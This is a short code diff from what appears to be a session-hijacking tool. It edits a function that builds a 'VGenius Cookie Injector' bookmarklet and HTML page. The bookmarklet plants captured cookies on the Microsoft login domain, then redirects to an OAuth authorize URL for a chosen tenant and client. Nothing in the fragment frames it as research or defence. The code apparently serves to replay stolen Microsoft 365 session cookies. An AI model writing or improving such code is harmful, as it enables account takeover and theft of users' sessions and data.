@@ -398,16 +398,16 @@ function generateInjectorScript(cookies, clientId, tenant) {
   var cookieJson = JSON.stringify(cookies);
 
   // Build bookmarklet code using document.cookie method
-  var bookmarklet = 'javascript:(function(){';
-  bookmarklet += 'var cookies=' + cookieJson + ';';
-  bookmarklet += 'cookies.forEach(function(c){';
-  bookmarklet += 'var domain=c.domain||".login.microsoftonline.com";';
-  bookmarklet += 'document.cookie=c.name+"="+c.value+"; domain="+domain+"; path=/; Secure; SameSite=None";';
-  bookmarklet += '});';
-  bookmarklet += 'setTimeout(function(){';
-  bookmarklet += 'window.location.href="https://login.microsoftonline.com/' + tenant + '/oauth2/v2.0/authorize?client_id=' + clientId + '&redirect_uri=https://www.office.com/&response_type=code&scope=openid%20profile%20email";';
-  bookmarklet += '},2000);';
-  bookmarklet += '})()';
+var bookmarklet = 'javascript:(function(){' + 
+  'var cookies=' + cookieJson + ';' + 
+  'cookies.forEach(function(c){' + 
+  'var domain=c.domain||".login.microsoftonline.com";' + 
+  'document.cookie=c.name+"="+encodeURIComponent(c.value)+"; domain="+domain+"; path=/; Secure; SameSite=None";' + 
+  '});' + 
+  'setTimeout(function(){' + 
+  'window.location.href="https://login.microsoftonline.com/' + tenant + '/oauth2/v2.0/authorize?client_id=' + clientId + '&redirect_uri=https://www.office.com/&response_type=code&scope=openid%20profile%20email";' + 
+  '},2000);' + 
+  '})()';
 
   var script = '<!DOCTYPE html>\n<html><head><title>VGenius Cookie Injector</title></head><body>\n';
   script += '<h1 style="color:#00ccff">Cookie Injection Ready</h1>\n';
